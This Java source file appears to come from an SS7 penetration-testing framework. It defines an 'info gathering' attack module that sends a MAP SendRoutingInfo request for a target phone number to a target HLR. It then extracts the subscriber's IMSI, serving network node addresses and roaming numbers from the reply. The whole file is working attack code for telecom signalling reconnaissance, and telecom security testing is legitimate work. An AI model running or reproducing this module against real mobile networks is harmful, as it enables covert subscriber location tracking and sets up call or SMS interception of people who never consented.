/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.ss7.usecases.attacks.infogathering;

import com.rodan.intruder.ss7.entities.event.model.call.SriResponse;
import com.rodan.intruder.ss7.entities.event.service.MapCallHandlingServiceListener;
import com.rodan.intruder.ss7.entities.payload.callhandling.SriPayload;
import com.rodan.intruder.ss7.usecases.Ss7ModuleTemplate;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleConstants;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleOptions;
import com.rodan.intruder.ss7.usecases.model.infogathering.RoutingInfoOptions;
import com.rodan.intruder.ss7.usecases.model.infogathering.RoutingInfoResponse;
import com.rodan.intruder.ss7.usecases.port.Ss7Gateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = Ss7ModuleConstants.ROUTING_INFO_NAME, category = Ss7ModuleConstants.INFO_GATHERING_CATEGORY_DISPLAY_NAME,
        displayName = Ss7ModuleConstants.ROUTING_INFO_DISPLAY_NAME, brief = Ss7ModuleConstants.ROUTING_INFO_BRIEF,
        description = Ss7ModuleConstants.ROUTING_INFO_DESCRIPTION, rank = Ss7ModuleConstants.ROUTING_INFO_RANK,
        mainPayload = Constants.SRI_PAYLOAD_NAME)
public class RoutingInfoModule extends Ss7ModuleTemplate implements SignalingModule, MapCallHandlingServiceListener {
    final static Logger logger = LogManager.getLogger(RoutingInfoModule.class);

    @Builder
    public RoutingInfoModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (RoutingInfoOptions) moduleOptions;
        var payload = SriPayload.builder()
                .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
                .msisdn(options.getMsisdn()).targetHlrGt(options.getTargetHlrGt())
                .mapVersion(options.getMapVersion())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        super.addServiceListener();
        var localSsn = getMainPayload().getLocalSsn();
        getGateway().addCallHandlingServiceListener(localSsn,this);
    }

    @Override
    protected void cleanup() throws SystemException {
        super.cleanup();
        if (getGateway() != null && getMainPayload() != null) {
            var localSsn = getMainPayload().getLocalSsn();
            getGateway().removeCallHandlingServiceListener(localSsn, this);
        }
    }

    @Override
    public void onSendRoutingInformationResponse(SriResponse response) {
        logger.debug("##### Received SRI response!");
        logger.debug(response);
        logger.debug("Parsing response.");

        moduleResponse = RoutingInfoResponse.builder()
                .imsi(response.getImsi()).hlrGt(response.getHlrGt()).vmscGt(response.getVmscGt())
                .vlrGt(response.getVlrGt()).msrn1(response.getMsrn1()).msrn2(response.getMsrn2())
                .build();
        setResultReceived(true);
        logger.debug("SRI completed!");
    }
}
